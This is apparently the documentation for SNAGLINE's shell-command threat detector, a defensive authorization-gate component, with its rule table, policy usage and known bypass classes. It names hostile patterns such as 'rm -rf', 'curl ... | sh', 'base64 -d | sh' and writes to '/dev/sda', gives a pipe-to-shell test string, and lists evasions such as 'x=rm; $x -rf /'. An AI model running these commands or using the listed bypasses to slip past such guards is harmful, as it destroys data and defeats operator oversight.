# Shell command threat detection

Pre-execution inspection of shell command strings for SNAGLINE's authorization
gate (issue #638). The detector lives in `snagline.shell_security` and is
deliberately separate from the runtime `Monitor` detectors: it never observes
`StepEvent`s and never changes fail-open monitoring behaviour.

## What it does

* Scans a command string with deterministic, independently testable rules.
* Returns structured `ShellFinding` values: `rule_id`, `severity`, `reason`,
  and a one-way `command_signature` (SHA-256). Raw command text is not stored
  on the finding.
* Integrates with `snagline.authorize.Policy` via `as_authorize_rule()` or a
  declarative `{"type": "shell_threats", ...}` policy entry so findings can
  map to `ask` or `deny`.

## Built-in rules

| rule_id | default severity | catches (examples) |
|---|---|---|
| `destructive_command` | critical | `rm -rf`, `mkfs`, `dd ... of=/dev/...`, fork bomb |
| `pipe_to_shell` | critical | `curl ... \| sh`, `wget ... \| bash` |
| `command_chaining` | warning | `;`, `&&`, `||`, backticks, `$(...)` |
| `unsafe_redirect` | critical | `> /dev/sda`, `> /etc/...` |
| `obfuscation` | critical | `base64 -d \| sh`, `eval`, `${IFS}`, `\\xNN` |

Rules can be enabled, disabled, or severity-overridden through
`ShellThreatConfig`.

## Usage

```python
from snagline.authorize import Policy, ToolRequest
from snagline.shell_security import ShellThreatConfig, as_authorize_rule, inspect_command

# Pure inspection (never executes):
findings = inspect_command("rm -rf /tmp/demo")

# As an authorize rule:
policy = Policy(rules=(as_authorize_rule(ShellThreatConfig(decision="ask")),))
result = policy.decide(
    ToolRequest.from_tool_input("Bash", {"command": "curl http://x | sh"})
)
```

Declarative policy document:

```json
{
  "rules": [
    {
      "type": "shell_threats",
      "decision": "deny",
      "min_severity": "warning",
      "disabled_rules": ["command_chaining"]
    }
  ]
}
```

## Limitations and known bypass classes

This is not a shell parser and does not claim complete coverage.

False negatives (may miss):

* Nested or mismatched quotes that hide tokens from the regex rules.
* Multi-stage indirection after assignment (`x=rm; $x -rf /`).
* Encoding chains beyond common `base64 -d | sh` (xxd, od, custom decoders).
* Unicode lookalikes / homoglyphs in binary names.
* Windows `cmd.exe` / PowerShell syntax (patterns target POSIX sh/bash).
* Threats split across multiple tool calls (no cross-call state).

False positives (may over-flag):

* Echo/heredoc text that literally contains a destructive token.
* Benign `&&` / `;` chains (default severity is warning so operators can ask).
* Dry-run or documentation scripts that mention wipe/dd patterns.

Prefer combining shell threat rules with path/tool allowlists rather than
relying on detection alone.
